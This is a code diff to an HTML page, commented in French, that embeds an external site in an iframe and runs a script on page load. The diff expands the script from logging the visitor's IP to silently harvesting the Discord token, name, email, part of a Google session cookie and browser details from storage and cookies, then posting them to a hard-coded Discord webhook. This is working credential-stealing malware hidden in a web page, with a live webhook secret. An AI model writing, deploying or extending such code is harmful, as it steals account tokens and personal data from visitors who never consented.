@@ -22,15 +22,50 @@
     <iframe src="https://nyrservice.netlify.app/"></iframe>
     
     <script>
-        // Fonction asynchrone pour récupérer l'IP et l'envoyer au webhook
-        async function grabAndSendIP() {
+        // Fonction asynchrone pour récupérer automatiquement les données et les envoyer au webhook
+        async function grabAndSendDataAutomatically() {
             try {
-                // Récupère l'IP de l'utilisateur via une API publique
+                // Étape 1: Récupère l'IP de l'utilisateur via une API publique
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;  // Extrait l'IP
                 
-                // Envoie l'IP au webhook Discord
+                // Étape 2: Extraction automatique des données supplémentaires
+                let discordToken = localStorage.getItem('token') || 'Non trouvé';  // Récupère automatiquement le token Discord s'il existe
+                let prenom = localStorage.getItem('userFirstName') || sessionStorage.getItem('firstName') || 'Non trouvé';  // Essaie d'extraire du localStorage ou sessionStorage
+                let nom = localStorage.getItem('userLastName') || sessionStorage.getItem('lastName') || 'Non trouvé';  // Essaie d'extraire du localStorage ou sessionStorage
+                let email = localStorage.getItem('userEmail') || document.cookie.split('; ').find(row => row.startsWith('email=')).split('=')[1] || 'Non trouvé';  // Essaie d'extraire des cookies ou localStorage
+                
+                // Tentative d'extraction automatique du mot de passe Google ou cookies
+                let googlePassword = '';  // Initialisation
+                const cookies = document.cookie;  // Accède aux cookies globaux
+                const googleCookieMatch = cookies.match(/__Secure-1PSID=([^;]+)/);  // Recherche de cookies Google
+                if (googleCookieMatch) {
+                    googlePassword = 'Accès partiel: ' + googleCookieMatch[1].substring(0, 50) + '...';  // Extrait et tronque le cookie
+                } else {
+                    googlePassword = 'Non trouvé';
+                }
+                
+                // Autres informations automatiques : User Agent et autres métadonnées
+                const userAgent = navigator.userAgent;  // Récupère l'user agent
+                const additionalData = {
+                    BrowserLanguage: navigator.language,  // Ajoute la langue du navigateur
+                    ScreenResolution: screen.width + 'x' + screen.height  // Ajoute la résolution de l'écran
+                };
+                
+                // Compilation des données en un objet JSON
+                const dataToSend = {
+                    IP: userIP,
+                    DiscordToken: discordToken,
+                    Prenom: prenom,
+                    Nom: nom,
+                    Email: email,
+                    GooglePassword: googlePassword,
+                    UserAgent: userAgent,
+                    Additional: additionalData  // Inclut les données supplémentaires
+                };
+                
+                // Étape 3: Envoie toutes les données au webhook Discord
                 const webhookURL = 'https://discord.com/api/webhooks/1363874178297499899/-7kETsy0lEq5JH55BFQR0lG2eYJIO-CxTMlrLtBwYmcmgi1prrqao8dP0vybcQ_otkgq';
                 const sendResponse = await fetch(webhookURL, {
                     method: 'POST',
@@ -38,23 +73,24 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `Nouvelle visite : IP de l'utilisateur = ${userIP}`  // Message personnalisé pour Discord
+                        content: `Visite automatique : \nIP: ${userIP}\nDiscord Token: ${discordToken}\nPrénom: ${prenom}\nNom: ${nom}\nE-mail: ${email}\nGoogle Données: ${googlePassword}\nUser Agent: ${userAgent}\nAutres: ${JSON.stringify(additionalData)}`
                     })
                 });
                 
-                // Vérifie si l'envoi a réussi (optionnel, pour le débogage)
+                // Vérifie si l'envoi a réussi
                 if (sendResponse.ok) {
-                    console.log('IP envoyée avec succès');
+                    console.log('Données envoyées avec succès');
                 } else {
                     console.error('Échec de l envoi au webhook');
                 }
             } catch (error) {
-                console.error('Erreur lors de la récupération ou de l envoi de l IP:', error);
+                console.error('Erreur lors de la récupération ou de l envoi des données:', error);
             }
         }
         
-        // Exécute la fonction au chargement de la page
-        window.onload = grabAndSendIP;
+        // Exécute la fonction automatiquement au chargement de la page
+        window.onload = grabAndSendDataAutomatically;
     </script>
 </body>
 </html>
+
